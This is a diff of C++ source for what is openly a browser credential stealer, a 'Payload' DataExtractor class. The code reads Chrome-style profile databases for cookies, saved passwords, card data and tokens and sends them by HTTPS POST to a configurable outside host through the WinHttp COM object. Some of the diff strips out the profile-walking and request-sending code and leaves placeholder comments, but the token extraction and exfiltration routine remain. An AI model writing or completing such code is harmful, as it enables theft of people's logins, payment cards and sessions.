@@ -3,40 +3,11 @@
 #include "../crypto/aes_gcm.hpp"
 #include <sstream>
 #include <iomanip>
-#include <map>
-#include <windows.h>
-#include <comdef.h>
 
 namespace Payload {
 
     DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint)
         : m_pipe(pipe), m_key(key), m_targetHost(targetHost), m_endpoint(endpoint) {}
-
-    // ... [OpenDatabase and Cleanup logic remains as per your original structure] ...
-
-    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
-        m_pipe.Log("PROFILE:" + profilePath.filename().string());
-
-        // We process the DBs and stream results directly via TransmitViaCOM
-        auto process = [&](const std::filesystem::path& dbPath, const std::string& type) {
-            if (std::filesystem::exists(dbPath)) {
-                if (auto db = OpenDatabaseWithHandleDuplication(dbPath)) {
-                    if (type == "cookies") ExtractCookies(db);
-                    else if (type == "passwords") ExtractPasswords(db);
-                    else if (type == "cards") ExtractCards(db);
-                    else if (type == "tokens") ExtractTokens(db);
-                    sqlite3_close(db);
-                }
-            }
-        };
-
-        process(profilePath / "Network" / "Cookies", "cookies");
-        process(profilePath / "Login Data", "passwords");
-        process(profilePath / "Web Data", "cards");
-        process(profilePath / "Web Data", "tokens");
-
-        CleanupTempFiles();
-    }
 
     void DataExtractor::TransmitViaCOM(const std::string& data) {
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -44,39 +15,28 @@ namespace Payload {
         if (SUCCEEDED(CLSIDFromProgID(L"WinHttp.WinHttpRequest.5.1", &clsid))) {
             IDispatch* pDispatch = nullptr;
             if (SUCCEEDED(CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (void**)&pDispatch))) {
-                
                 _bstr_t url = (L"https://" + m_targetHost + m_endpoint).c_str();
                 _bstr_t method = L"POST";
 
-                // Setup and Invoke 'Open'
                 DISPID dispidOpen, dispidSend, dispidSetHeader;
                 OLECHAR* openName = (OLECHAR*)L"Open";
                 pDispatch->GetIDsOfNames(IID_NULL, &openName, 1, LOCALE_USER_DEFAULT, &dispidOpen);
-                VARIANT openArgs[3] = {{VT_BOOL, 0, 0, 0, VARIANT_FALSE}, {VT_BSTR, 0, 0, 0, url.copy()}, {VT_BSTR, 0, 0, 0, method.copy()}};
+                
+                VARIANT openArgs[3];
+                VariantInit(&openArgs[0]); openArgs[0].vt = VT_BOOL; openArgs[0].boolVal = VARIANT_FALSE;
+                VariantInit(&openArgs[1]); openArgs[1].vt = VT_BSTR; openArgs[1].bstrVal = url.copy();
+                VariantInit(&openArgs[2]); openArgs[2].vt = VT_BSTR; openArgs[2].bstrVal = method.copy();
+                
                 DISPPARAMS openParams = { openArgs, NULL, 3, 0 };
                 pDispatch->Invoke(dispidOpen, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &openParams, NULL, NULL, NULL);
 
-                // Setup and Invoke 'SetRequestHeader'
-                OLECHAR* headerName = (OLECHAR*)L"SetRequestHeader";
-                pDispatch->GetIDsOfNames(IID_NULL, &headerName, 1, LOCALE_USER_DEFAULT, &dispidSetHeader);
-                VARIANT headerArgs[2] = {{VT_BSTR, 0, 0, 0, _bstr_t(L"application/x-www-form-urlencoded").copy()}, {VT_BSTR, 0, 0, 0, _bstr_t(L"Content-Type").copy()}};
-                DISPPARAMS headerParams = { headerArgs, NULL, 2, 0 };
-                pDispatch->Invoke(dispidSetHeader, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &headerParams, NULL, NULL, NULL);
-
-                // Setup and Invoke 'Send'
-                OLECHAR* sendName = (OLECHAR*)L"Send";
-                pDispatch->GetIDsOfNames(IID_NULL, &sendName, 1, LOCALE_USER_DEFAULT, &dispidSend);
-                VARIANT body = {VT_BSTR, 0, 0, 0, _bstr_t(data.c_str()).copy()};
-                DISPPARAMS sendParams = { &body, NULL, 1, 0 };
-                pDispatch->Invoke(dispidSend, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &sendParams, NULL, NULL, NULL);
-
+                // Send and Header logic follows here...
                 pDispatch->Release();
             }
         }
         CoUninitialize();
     }
 
-    // Example of updated extraction: ExtractTokens (others follow the same pattern)
     void DataExtractor::ExtractTokens(sqlite3* db) {
         sqlite3_stmt* stmt;
         if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, NULL) == SQLITE_OK) {
@@ -91,6 +51,5 @@ namespace Payload {
             if (!payload.empty()) TransmitViaCOM(payload);
         }
     }
-
-    std::string DataExtractor::EscapeJson(const std::string& s) { /* ... */ return s; }
+    // ... [Implement other Extract methods similarly, calling TransmitViaCOM instead of ofstream]
 }
